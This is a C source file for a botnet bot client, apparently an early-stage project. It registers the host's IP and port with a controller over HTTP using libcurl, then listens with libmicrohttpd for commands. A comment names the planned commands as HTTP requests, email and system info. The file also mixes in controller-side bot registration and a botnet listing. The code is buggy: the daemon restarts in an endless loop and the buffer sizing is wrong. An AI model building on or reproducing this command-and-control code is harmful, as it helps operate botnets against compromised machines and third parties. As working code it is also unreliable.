#include "bot.h"

char host[256];
char *IP;
long port = 2324;
int ret;
struct MHD_Daemon *mhd_daemon;
void setBotIP();
int connectToController();
int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls);

int main(int argc, char const *argv[])
{

    /*
     * Connect to controller and send http request like so: http://localhost:8081?PORT=2343&IP=1.2.3.2
     * then close connection and mantain connection on port specified
     * react to commands: HTTP_REQ -> EMAIL -> SYS_INFO
     * after performing such operation inform controller that operation has ended
     */

    setBotIP();

    ret = connectToController();
    if (ret < 0)
        handle_error("Could not connect to controller");

    while (1)
    {

        const union MHD_ConnectionInfo *conninfo;

        mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, port, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
        if (mhd_daemon == NULL)
        {
            fprintf(stderr, "Error starting daemon.\n");
            _exit(EXIT_FAILURE);
        }

        fprintf(stdout, "Passive mode: listening on port : %ld.\n", port);
    }

    return 0;
}

int connectToController()
{
    ret = 1;

    CURL *curl;
    curl = curl_easy_init();
    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");

    // * ### BUILD URL ###
    char *url = (char *)malloc(sizeof(PROTOCOL) + sizeof(IP) + sizeof(C_PORT) + sizeof(C_IP) + 5);

    strcpy(url, PROTOCOL);
    strcat(url, CONTROLLER_IP);

    char *query = (char *)malloc(16 + sizeof(IP) + 5);
    sprintf(query, "?PORT=%ld&IP=%s", port, IP);

    strcat(url, query);

    // * ### BUILD URL ###

    curl_easy_setopt(curl, CURLOPT_LOCALPORT, port);
    curl_easy_setopt(curl, CURLOPT_PORT, CONTROLLER_PORT);
    curl_easy_setopt(curl, CURLOPT_LOCALPORTRANGE, 65535);
    // curl_easy_setopt(curl, CURLOPT_NOBODY, 1);

    // * create url
    curl_easy_setopt(curl, CURLOPT_URL, url);

    printf("Connecting to controller... \n");
    ret = curl_easy_perform(curl);

    // curl_easy_getinfo(curl, CURLINFO_PRIMARY_PORT, &port);
    if (ret == CURLE_OK)
    {
        long port;
        ret = curl_easy_getinfo(curl, CURLINFO_PRIMARY_PORT, &port);
        if (!ret)
            printf("\nConnected to remote port: %ld , url: %s\n", port, url);
    }
    else
    {
        ret = -1;
    }

    curl_easy_cleanup(curl);

    free(url);
    free(query);

    return ret;
}

void setBotIP()

{
    struct hostent *host_entry;
    int hostname;
    hostname = gethostname(host, sizeof(host));                      // find the host name
    host_entry = gethostbyname(host);                                // find host information
    IP = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0])); // Convert into IP string

    printf("Current Host Name: %s\n", host);
    printf("Host IP: %s\n", IP);
}

int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                   const char *method, const char *version, const char *upload_data,
                   size_t *upload_data_size, void **con_cls)
{

    const char *msg = "OK";
    struct MHD_Response *response;
    int ret;

    response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);

    const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
    const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);

    long port = atol(bot_port);
    struct in_addr address;
    inet_pton(AF_INET, bot_ip, &(address));


    // TODO get updates from bots

    if (findBot(address, port) == -1)
    {

        ret = registerBot(bot_ip, bot_port);

        if (ret < 0)
        {
            const char *msg = "NOT OK";
        }
        printf("Bot Connected \n");
    }

    list_botnet(1);
    MHD_destroy_response(response);

    return ret;

    
}